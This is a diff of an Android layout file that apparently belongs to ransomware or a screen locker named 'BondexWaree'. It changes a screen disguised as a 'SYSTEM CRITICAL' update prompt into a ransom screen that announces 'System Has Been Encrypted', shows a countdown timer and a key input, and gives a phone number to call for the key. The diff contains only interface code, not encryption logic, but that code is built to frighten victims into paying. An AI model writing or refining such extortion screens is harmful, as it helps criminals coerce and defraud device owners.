@@ -10,22 +10,26 @@
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="SYSTEM CRITICAL"
-        android:textColor="#FF0000"
-        android:textSize="40sp"
+        android:text="BondexWaree"
+        android:textColor="#00FF41"
+        android:textSize="36sp"
         android:textStyle="bold"
-        android:shadowColor="#FF0000"
-        android:shadowRadius="25" />
+        android:shadowColor="#00FF41"
+        android:shadowRadius="15" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="System Has Been Encrypted"
+        android:textColor="#FFFFFF"
+        android:textSize="14sp" />
 
     <TextView
         android:id="@+id/v_timer"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_marginTop="5dp"
-        android:text="24:00:00"
-        android:textColor="#FF4444"
-        android:textSize="32sp"
-        android:textStyle="bold"
+        android:layout_marginTop="15dp"
+        android:textSize="18sp"
         android:fontFamily="monospace" />
 
     <TextView
@@ -35,10 +39,10 @@
         android:layout_marginTop="30dp"
         android:background="@drawable/input_glow"
         android:gravity="center"
-        android:hint="ENTER KEY"
+        android:hint="VERIFICATION KEY"
         android:textColor="#00FF41"
         android:textColorHint="#113311"
-        android:textSize="22sp"
+        android:textSize="20sp"
         android:letterSpacing="0.4"
         android:elevation="10dp" />
 
@@ -69,9 +73,9 @@
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:layout_marginTop="25dp"
-        android:text="VERIFICATION CODE REQUIRED FOR UPDATE"
+        android:text="CONTACT PHONE TO GET KEY : +62 831-844-167-10"
         android:textColor="#00FF41"
-        android:textSize="12sp"
+        android:textSize="11sp"
         android:textStyle="bold"
         android:fontFamily="monospace" />
 
